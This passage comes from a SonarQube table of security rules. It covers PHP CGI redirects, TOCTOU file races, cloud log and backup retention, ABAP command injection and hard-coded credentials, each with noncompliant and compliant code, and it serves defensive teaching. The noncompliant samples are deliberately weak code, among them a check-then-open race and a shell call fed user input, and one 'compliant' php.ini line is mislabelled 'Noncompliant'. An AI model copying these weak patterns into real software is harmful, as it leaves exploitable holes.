legitimate user of the application.</p>
<h2>How to fix it</h2>
<p><code>cgi.force_redirect</code> should be enforced in the main PHP configuration file.</p>
<p>Note that this parameter is enabled by default.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
; php.ini
cgi.force_redirect=0  ; Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
; php.ini
cgi.force_redirect=1  ; Noncompliant
</pre>
<h3>Pitfalls</h3>
<p>The <code>cgi.force_redirect</code> is not supported by all web servers. For example, Microsoft IIS web server is unable to differentiate an
internally redirected request from a normal one.</p>
<p>While using such a server, the <code>cgi.force_redirect</code> parameter will have to be disabled for the CGI scripts to work properly. In that
case, it is important to ensure the CGI behavior is aware of the security threat.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/305">CWE-305 - Authentication Bypass by Primary Weakness</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5847">
              c:S5847
            </a>
          </td>
          <td>
            <details>
              <p>When an application manipulates files, "Time-Of-Check to Time-Of-Use" can occur when a file-checking operation is disconnected from the actual
operation it is bound to.</p>
<p>For example, such a vulnerability occurs when a file existence check is performed strictly before a file creation operation.</p>
<h2>Why is this an issue?</h2>
<p>Race conditions can happen when file operations and their associated pre-checks are disconnected. Indeed, while the application assumes that the
checked file property will not change before performing the operation, there is a chance that changes are applied to the file.</p>
<p>Especially, a concurrent process, which an attacker can control, could modify a file right after a check is performed and before the actual use.
This file can be deleted, created, altered, or see its permissions changed depending on the use case.</p>
<h3>What is the potential impact?</h3>
<p>The impact of a successfully exploited race condition is dependent on the business logic of the vulnerable application. The consequences will vary
depending on what check is performed and how the file is used.</p>
<p>In general, attackers use such attacks to escalate privileges, execute arbitrary code, or perform a denial of service.</p>
<h4>Arbitrary code execution</h4>
<p>Executable or script file integrity and authenticity checks can be bypassed when exploiting a TOCTOU vulnerability. In such a scenario, attackers
would change an executable file content between when its integrity is checked and when the application executes it.</p>
<p>This attack would allow attackers to trick the application into executing malicious, arbitrary code. They would then be granted the same privilege
levels as the application itself, which can be particularly severe when it runs with administration privileges.</p>
<h4>Privileges escalation</h4>
<p>When the attacker is a local user on the same server as the running application, the same attack is possible with extended probability. In such a
case, attackers can exploit the reading and writing to configuration files, the creation of local network resources, or the use of temporary files to
achieve the same code execution purpose.</p>
<p>However, in that case, the attack is only meaningful when the application is running with high or otherwise interesting privileges. Attackers
exploiting a TOCTOU vulnerability that way would achieve horizontal or vertical privilege escalation.</p>
<h4>Denial of service</h4>
<p>When the application expects some file properties to be set at the operation time, it will often face unexpected errors when those properties have
actually changed. This might be the case when writing to a file where newly set permissions forbid that operation or when reading from a deleted
file.</p>
<p>When such errors are faced, the application might unexpectedly stop, which can affect its availability. Depending on the application and hosting
architectures, the interruption can be temporary or permanent, partial or complete.</p>
<h2>How to fix it</h2>
<p>To prevent TOCTOU race condition issues, best practices recommend relying on file operations that can perform the necessary preliminary checks
atomically. For example, file opening functions usually accept a parameter to check the file exists and return an error depending on the result. This
check is atomic and is not susceptible to race conditions.</p>
<p>When this is not possible, it might be possible to open a file directly, and to keep a reference to it for later use. If the conditions are set for
the subsequent operations, the application can continue with its processing and use the open file pointer to read or write to the file. In the
opposite case, an error might be raised that will need to be properly handled.</p>
<p>To finish, for most complex operations, the application can create a dedicated working directory and set tight permissions on it. This needs to be
performed atomically to prevent further race conditions. All subsequent sensitive file operations can then be performed in this dedicated
directory.</p>
<p>Note that this last solution is imperfect and is still susceptible to race condition attacks from privileged users and the application itself. It
should be used when no other countermeasure is acceptable.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>The following code sample is susceptible to a race condition attack because it checks a file exists strictly before it opens it for writing.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
FILE *fopen_if_not_exists(const char *file) {
  if (access(file, F_OK) == -1 &amp;&amp; errno == ENOENT) {
    FILE *f = fopen(file, "w"); // Noncompliant

    return f;
  }

  return nullptr;
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
FILE *fopen_if_not_exists(const char *file) {
  FILE *f = fopen(file, "wx");
  return f;
}
</pre>
<h3>How does this work?</h3>
<p>Here, the compliant code example uses an atomic operation to open the file and check for its existence beforehand.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Carnegie Mellon University Software Engineering Institure - <a
  href="https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.+Avoid+TOCTOU+race+conditions+while+accessing+files">FIO45-C. - Avoid TOCTOU race
  conditions while accessing files</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/367">CWE-367 - Time-of-check Time-of-use (TOCTOU) Race Condition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6413">
              azureresourcemanager:S6413
            </a>
          </td>
          <td>
            <details>
              <p>Defining a short log retention duration can reduce an organization’s ability to backtrace the actions of malicious actors in case of a security
incident.</p>
<p>Logging allows operational and security teams to get detailed and real-time feedback on an information system’s events. The logging coverage
enables them to quickly react to events, ranging from the most benign bugs to the most impactful security incidents, such as intrusions.</p>
<p>Apart from security detection, logging capabilities also directly influence future digital forensic analyses. For example, detailed logging will
allow investigators to establish a timeline of the actions perpetrated by an attacker.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This component is essential for the information system infrastructure. </li>
  <li> This component is essential for mission-critical functions. </li>
  <li> Compliance policies require traceability for a longer duration. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Increase the log retention period to an amount of time sufficient enough to be able to investigate and restore service in case of an incident.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.microsoft.com/en-us/azure/firewall-manager/policy-overview">Azure Firewall Policy</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Network/firewallPolicies",
      "apiVersion": "2022-07-01",
      "properties": {
        "insights": {
          "isEnabled": true,
          "retentionDays": 7
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource firewallPolicy 'Microsoft.Network/firewallPolicies@2022-07-01' = {
  properties: {
    insights: {
      isEnabled: true
      retentionDays: 7  // Sensitive
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.network/networkwatchers/flowlogs">Microsoft Network Network Watchers Flow
Logs</a>:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "networkWatchers/example",
      "type": "Microsoft.Network/networkWatchers/flowLogs",
      "apiVersion": "2022-07-01",
      "properties": {
        "retentionPolicy": {
          "days": 7,
          "enabled": true
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource networkWatchersFlowLogs 'Microsoft.Network/networkWatchers/flowLogs@2022-07-01' = {
  properties: {
    retentionPolicy: {
      days: 7
      enabled: true
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.sql/2021-11-01/servers/auditingsettings">Microsoft SQL Servers Auditing
Settings</a>:</p>
<pre data-diff-id="5" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example/default",
      "type": "Microsoft.Sql/servers/auditingSettings",
      "apiVersion": "2021-11-01",
      "properties": {
        "retentionDays": 7,
        "state": "Enabled"
      }
    }
  ]
}
</pre>
<pre data-diff-id="6" data-diff-type="noncompliant">
resource sqlServerAudit 'Microsoft.Sql/servers/auditingSettings@2021-11-01' = {
  properties: {
    retentionDays: 7    // Sensitive
  }
}
</pre>
<p>This rule also applies to log retention periods that are too short, on the following resources:</p>
<ul>
  <li> <code>Microsoft.DBforMariaDB/servers/securityAlertPolicies</code> - for <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformariadb/2018-06-01/servers/securityalertpolicies">Microsoft DB for MariaDB
  Servers Security Alert Policies</a> </li>
  <li> <code>Microsoft.Sql/servers/databases/securityAlertPolicies</code> - for <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.sql/servers/databases/securityalertpolicies">Microsoft Sql Servers Databases
  Security Alert Policies</a> </li>
  <li> <code>Microsoft.Sql/servers/auditingPolicies</code> - for <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.sql/servers/auditingpolicies">Microsoft Sql Servers Auditing Policies</a> </li>
  <li> <code>Microsoft.Synapse/workspaces/auditingSettings</code> - for <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.synapse/2021-06-01/workspaces/auditingsettings">Microsoft Synapse Workspaces
  Auditing Settings</a> </li>
  <li> <code>Microsoft.Synapse/workspaces/sqlPools/securityAlertPolicies</code> - for <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.synapse/workspaces/sqlpools/securityalertpolicies?pivots=deployment-language-bicep">Microsoft Synapse Workspaces Sql Pools Security Alert Policies</a> </li>
</ul>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.microsoft.com/en-us/azure/firewall-manager/policy-overview">Azure Firewall Policy</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Network/firewallPolicies",
      "apiVersion": "2022-07-01",
      "properties": {
        "insights": {
          "isEnabled": true,
          "retentionDays": 30
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
resource firewallPolicy 'Microsoft.Network/firewallPolicies@2022-07-01' = {
  properties: {
    insights: {
      isEnabled: true
      retentionDays: 30
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.network/networkwatchers/flowlogs">Microsoft Network Network Watchers Flow
Logs</a>:</p>
<pre data-diff-id="3" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "networkWatchers/example",
      "type": "Microsoft.Network/networkWatchers/flowLogs",
      "apiVersion": "2022-07-01",
      "properties": {
        "retentionPolicy": {
          "days": 30,
          "enabled": true
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="4" data-diff-type="compliant">
resource networkWatchersFlowLogs 'Microsoft.Network/networkWatchers/flowLogs@2022-07-01' = {
  properties: {
    retentionPolicy: {
      days: 30
      enabled: true
    }
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.sql/2021-11-01/servers/auditingsettings">Microsoft SQL Servers Auditing
Settings</a>:</p>
<pre data-diff-id="5" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example/default",
      "type": "Microsoft.Sql/servers/auditingSettings",
      "apiVersion": "2021-11-01",
      "properties": {
        "retentionDays": 30,
        "state": "Enabled"
      }
    }
  ]
}
</pre>
<pre data-diff-id="6" data-diff-type="compliant">
resource sqlServerAudit 'Microsoft.Sql/servers/auditingSettings@2021-11-01' = {
  properties: {
    retentionDays: 30
  }
}
</pre>
<p>Above code also applies to other types defined in previous paragraph.</p>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6364">
              azureresourcemanager:S6364
            </a>
          </td>
          <td>
            <details>
              <p>Reducing the backup retention duration can reduce an organization’s ability to re-establish service in case of a security incident.</p>
<p>Data backups allow to overcome corruption or unavailability of data by recovering as efficiently as possible from a security incident.</p>
<p>Backup retention duration, coverage, and backup locations are essential criteria regarding functional continuity.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This component is essential for the information system infrastructure. </li>
  <li> This component is essential for mission-critical functions. </li>
  <li> Compliance policies require this component to be backed up for a specific amount of time. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Increase the backup retention period to an amount of time sufficient enough to be able to restore service in case of an incident.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites/config-backup?pivots=deployment-language-arm-template">Azure App
Service</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource webApp 'Microsoft.Web/sites@2022-03-01' = {
  name: 'webApp'
}

resource backup 'config@2022-03-01' = {
  name: 'backup'
  parent: webApp
  properties: {
    backupSchedule: {
      frequencyInterval: 1
      frequencyUnit: 'Day'
      keepAtLeastOneBackup: true
      retentionPeriodInDays: 2  // Sensitive
    }
  }
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites",
      "apiVersion": "2022-03-01",
      "name": "webApp",
    },
    {
      "type": "Microsoft.Web/sites/config",
      "apiVersion": "2022-03-01",
      "name": "webApp/backup",
      "properties": {
        "backupSchedule": {
          "frequencyInterval": 1,
          "frequencyUnit": "Day",
          "keepAtLeastOneBackup": true,
          "retentionPeriodInDays": 2
        }
      },
      "dependsOn": [
        "[resourceId('Microsoft.Web/sites', 'webApp')]"
      ]
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.documentdb/databaseaccounts?pivots=deployment-language-arm-template">Azure
Cosmos DB</a> accounts:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
resource cosmosDb 'Microsoft.DocumentDB/databaseAccounts@2023-04-15' = {
    properties: {
        backupPolicy: {
            type: 'Periodic'
            periodicModeProperties: {
                backupIntervalInMinutes: 1440
                backupRetentionIntervalInHours: 8  // Sensitive
            }
        }
    }
}
</pre>
<pre data-diff-id="4" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.DocumentDB/databaseAccounts",
      "apiVersion": "2023-04-15",
      "properties": {
        "backupPolicy": {
          "type": "Periodic",
          "periodicModeProperties": {
            "backupIntervalInMinutes": 1440,
            "backupRetentionIntervalInHours": 8
          }
        }
      }
    }
  ]
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.recoveryservices/vaults/backuppolicies?pivots=deployment-language-arm-template">Azure
Backup</a> vault policies:</p>
<pre data-diff-id="5" data-diff-type="noncompliant">
resource vault 'Microsoft.RecoveryServices/vaults@2023-01-01' = {
    name: 'testVault'

    resource backupPolicy 'backupPolicies@2023-01-01' = {
        name: 'backupPolicy'
        properties: {
            backupManagementType: 'AzureSql'
            retentionPolicy: {
                retentionPolicyType: 'SimpleRetentionPolicy'
                retentionDuration: {
                    count: 2  // Sensitive
                    durationType: 'Days'
                }
            }
        }
    }
}
</pre>
<pre data-diff-id="6" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.RecoveryServices/vaults",
      "apiVersion": "2023-01-01",
      "name": "testVault",
      "resources": [
        {
          "type": "backupPolicies",
          "apiVersion": "2023-01-01",
          "name": "testVault/backupPolicy",
          "properties": {
            "backupManagementType": "AzureSql",
            "retentionPolicy": {
              "retentionPolicyType": "SimpleRetentionPolicy",
              "retentionDuration": {
                "count": 2,
                "durationType": "Days"
              }
            }
          }
        }
      ]
    }
  ]
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites/config-backup?pivots=deployment-language-arm-template">Azure App
Service</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource webApp 'Microsoft.Web/sites@2022-03-01' = {
  name: 'webApp'
}

resource backup 'config@2022-03-01' = {
  name: 'backup'
  parent: webApp
  properties: {
    backupSchedule: {
      frequencyInterval: 1
      frequencyUnit: 'Day'
      keepAtLeastOneBackup: true
      retentionPeriodInDays: 8
    }
  }
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites",
      "apiVersion": "2022-03-01",
      "name": "webApp",
    },
    {
      "type": "Microsoft.Web/sites/config",
      "apiVersion": "2022-03-01",
      "name": "webApp/backup",
      "properties": {
        "backupSchedule": {
          "frequencyInterval": 1,
          "frequencyUnit": "Day",
          "keepAtLeastOneBackup": true,
          "retentionPeriodInDays": 30
        }
      },
      "dependsOn": [
        "[resourceId('Microsoft.Web/sites', 'webApp')]"
      ]
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.documentdb/databaseaccounts?pivots=deployment-language-arm-template">Azure
Cosmos DB</a> accounts:</p>
<pre data-diff-id="3" data-diff-type="compliant">
resource cosmosDb 'Microsoft.DocumentDB/databaseAccounts@2023-04-15' = {
    properties: {
        backupPolicy: {
            type: 'Periodic'
            periodicModeProperties: {
                backupIntervalInMinutes: 1440
                backupRetentionIntervalInHours: 192
            }
        }
    }
}
</pre>
<pre data-diff-id="4" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.DocumentDB/databaseAccounts",
      "apiVersion": "2023-04-15",
      "properties": {
        "backupPolicy": {
          "type": "Periodic",
          "periodicModeProperties": {
            "backupIntervalInMinutes": 1440,
            "backupRetentionIntervalInHours": 720
          }
        }
      }
    }
  ]
}
</pre>
<p>For <a
href="https://learn.microsoft.com/en-us/azure/templates/microsoft.recoveryservices/vaults/backuppolicies?pivots=deployment-language-arm-template">Azure
Backup</a> vault policies:</p>
<pre data-diff-id="5" data-diff-type="compliant">
resource vault 'Microsoft.RecoveryServices/vaults@2023-01-01' = {
    name: 'testVault'

    resource backupPolicy 'backupPolicies@2023-01-01' = {
        name: 'backupPolicy'
        properties: {
            backupManagementType: 'AzureSql'
            retentionPolicy: {
                retentionPolicyType: 'SimpleRetentionPolicy'
                retentionDuration: {
                    count: 8
                    durationType: 'Days'
                }
            }
        }
    }
}
</pre>
<pre data-diff-id="6" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.RecoveryServices/vaults",
      "apiVersion": "2023-01-01",
      "name": "testVault",
      "resources": [
        {
          "type": "backupPolicies",
          "apiVersion": "2023-01-01",
          "name": "testVault/backupPolicy",
          "properties": {
            "backupManagementType": "AzureSql",
            "retentionPolicy": {
              "retentionPolicyType": "SimpleRetentionPolicy",
              "retentionDuration": {
                "count": 30,
                "durationType": "Days"
              }
            }
          }
        }
      ]
    }
  ]
}
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6413">
              terraform:S6413
            </a>
          </td>
          <td>
            <details>
              <p>Defining a short log retention duration can reduce an organization’s ability to backtrace the actions of malicious actors in case of a security
incident.</p>
<p>Logging allows operational and security teams to get detailed and real-time feedback on an information system’s events. The logging coverage
enables them to quickly react to events, ranging from the most benign bugs to the most impactful security incidents, such as intrusions.</p>
<p>Apart from security detection, logging capabilities also directly influence future digital forensic analyses. For example, detailed logging will
allow investigators to establish a timeline of the actions perpetrated by an attacker.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This component is essential for the information system infrastructure. </li>
  <li> This component is essential for mission-critical functions. </li>
  <li> Compliance policies require traceability for a longer duration. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Increase the log retention period to an amount of time sufficient enough to be able to investigate and restore service in case of an incident.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/Working-with-log-groups-and-streams.html">AWS Cloudwatch Logs</a>:</p>
<pre>
resource "aws_cloudwatch_log_group" "example" {
  name = "example"
  retention_in_days = 3 # Sensitive
}
</pre>
<p>For <a href="https://docs.microsoft.com/en-us/azure/firewall-manager/policy-overview">Azure Firewall Policy</a>:</p>
<pre>
resource "azurerm_firewall_policy" "example" {
  insights {
    enabled = true
    retention_in_days = 7 # Sensitive
  }
}
</pre>
<p>For <a href="https://cloud.google.com/logging/docs/routing/overview#buckets">Google Cloud Logging buckets</a>:</p>
<pre>
resource "google_logging_project_bucket_config" "example" {
    project = var.project
    location = "global"
    retention_days = 7 # Sensitive
    bucket_id = "_Default"
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/Working-with-log-groups-and-streams.html">AWS Cloudwatch Logs</a>:</p>
<pre>
resource "aws_cloudwatch_log_group" "example" {
  name = "example"
  retention_in_days = 30
}
</pre>
<p>For <a href="https://docs.microsoft.com/en-us/azure/firewall-manager/policy-overview">Azure Firewall Policy</a>:</p>
<pre>
resource "azurerm_firewall_policy" "example" {
  insights {
    enabled = true
    retention_in_days = 30
  }
}
</pre>
<p>For <a href="https://cloud.google.com/logging/docs/routing/overview#buckets">Google Cloud Logging buckets</a>:</p>
<pre>
resource "google_logging_project_bucket_config" "example" {
    project = var.project
    location = "global"
    retention_days = 30
    bucket_id = "_Default"
}
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5847">
              cpp:S5847
            </a>
          </td>
          <td>
            <details>
              <p>When an application manipulates files, "Time-Of-Check to Time-Of-Use" can occur when a file-checking operation is disconnected from the actual
operation it is bound to.</p>
<p>For example, such a vulnerability occurs when a file existence check is performed strictly before a file creation operation.</p>
<h2>Why is this an issue?</h2>
<p>Race conditions can happen when file operations and their associated pre-checks are disconnected. Indeed, while the application assumes that the
checked file property will not change before performing the operation, there is a chance that changes are applied to the file.</p>
<p>Especially, a concurrent process, which an attacker can control, could modify a file right after a check is performed and before the actual use.
This file can be deleted, created, altered, or see its permissions changed depending on the use case.</p>
<h3>What is the potential impact?</h3>
<p>The impact of a successfully exploited race condition is dependent on the business logic of the vulnerable application. The consequences will vary
depending on what check is performed and how the file is used.</p>
<p>In general, attackers use such attacks to escalate privileges, execute arbitrary code, or perform a denial of service.</p>
<h4>Arbitrary code execution</h4>
<p>Executable or script file integrity and authenticity checks can be bypassed when exploiting a TOCTOU vulnerability. In such a scenario, attackers
would change an executable file content between when its integrity is checked and when the application executes it.</p>
<p>This attack would allow attackers to trick the application into executing malicious, arbitrary code. They would then be granted the same privilege
levels as the application itself, which can be particularly severe when it runs with administration privileges.</p>
<h4>Privileges escalation</h4>
<p>When the attacker is a local user on the same server as the running application, the same attack is possible with extended probability. In such a
case, attackers can exploit the reading and writing to configuration files, the creation of local network resources, or the use of temporary files to
achieve the same code execution purpose.</p>
<p>However, in that case, the attack is only meaningful when the application is running with high or otherwise interesting privileges. Attackers
exploiting a TOCTOU vulnerability that way would achieve horizontal or vertical privilege escalation.</p>
<h4>Denial of service</h4>
<p>When the application expects some file properties to be set at the operation time, it will often face unexpected errors when those properties have
actually changed. This might be the case when writing to a file where newly set permissions forbid that operation or when reading from a deleted
file.</p>
<p>When such errors are faced, the application might unexpectedly stop, which can affect its availability. Depending on the application and hosting
architectures, the interruption can be temporary or permanent, partial or complete.</p>
<h2>How to fix it</h2>
<p>To prevent TOCTOU race condition issues, best practices recommend relying on file operations that can perform the necessary preliminary checks
atomically. For example, file opening functions usually accept a parameter to check the file exists and return an error depending on the result. This
check is atomic and is not susceptible to race conditions.</p>
<p>When this is not possible, it might be possible to open a file directly, and to keep a reference to it for later use. If the conditions are set for
the subsequent operations, the application can continue with its processing and use the open file pointer to read or write to the file. In the
opposite case, an error might be raised that will need to be properly handled.</p>
<p>To finish, for most complex operations, the application can create a dedicated working directory and set tight permissions on it. This needs to be
performed atomically to prevent further race conditions. All subsequent sensitive file operations can then be performed in this dedicated
directory.</p>
<p>Note that this last solution is imperfect and is still susceptible to race condition attacks from privileged users and the application itself. It
should be used when no other countermeasure is acceptable.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>The following code sample is susceptible to a race condition attack because it checks a file exists strictly before it opens it for writing.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
FILE *fopen_if_not_exists(const char *file) {
  if (access(file, F_OK) == -1 &amp;&amp; errno == ENOENT) {
    FILE *f = fopen(file, "w"); // Noncompliant

    return f;
  }

  return nullptr;
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
FILE *fopen_if_not_exists(const char *file) {
  FILE *f = fopen(file, "wx");
  return f;
}
</pre>
<h3>How does this work?</h3>
<p>Here, the compliant code example uses an atomic operation to open the file and check for its existence beforehand.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Carnegie Mellon University Software Engineering Institure - <a
  href="https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.+Avoid+TOCTOU+race+conditions+while+accessing+files">FIO45-C. - Avoid TOCTOU race
  conditions while accessing files</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/367">CWE-367 - Time-of-check Time-of-use (TOCTOU) Race Condition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S4721">
              abap:S4721
            </a>
          </td>
          <td>
            <details>
              <p>Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be
used (when parameters are user-controlled for instance) to inject OS commands.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> OS command name or parameters are user-controlled. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use functions that don’t spawn a shell.</p>
<h2>Sensitive Code Example</h2>
<pre>
CALL 'SYSTEM' ID 'COMMAND' FIELD usr_input ID 'TAB' FIELD TAB1.  " Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
CALL 'SYSTEM' ID 'COMMAND' FIELD "/usr/bin/file.exe" ID 'TAB' FIELD TAB1.  " Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP Top 10 2021 Category A3</a> - Injection </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/78">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S2068">
              abap:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
